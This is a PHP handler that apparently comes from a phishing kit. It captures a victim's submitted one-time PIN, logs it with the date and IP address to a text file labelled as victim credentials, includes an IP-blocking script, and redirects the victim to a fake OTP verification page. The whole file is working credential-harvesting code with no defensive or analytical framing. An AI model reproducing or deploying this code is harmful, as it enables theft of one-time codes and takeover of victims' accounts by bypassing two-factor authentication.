<?php
include 'AddResult.php';
include 'ip_blocker.php';
if(isset($_POST['OTP'])) {
$rnd = "otp".rand(36773,346737);
$victim_creds = "
<span style='color:gray;'>{$date} {$IP}</span>  
<span style='color:red;'>One-Time PIN (OTP) </span> > 
[<span style='color:green;' id='{$rnd}' data-clipboard-text='{$_POST['OTP']}'>{$_POST['OTP']}</span>]
<script>
    var $rnd = document.getElementById('{$rnd}');
    var clipboard = new ClipboardJS($rnd);

    clipboard.on('success', function(e) {
        console.log(e);
    });

    clipboard.on('error', function(e) {
        console.log(e);
    });
    </script>

<br>";

    AddResult('errors.txt', $victim_creds);
    $m = $_POST['auth'];
	echo "<script>";
	echo "window.location.assign('otpverification.php?auth=$m&secure=dW5hbWU=&id=bWFuZ21ra2Vwd2VuZ0B5YWhvby5jb20=&wrong=87935');";
	echo "</script>";

}
?>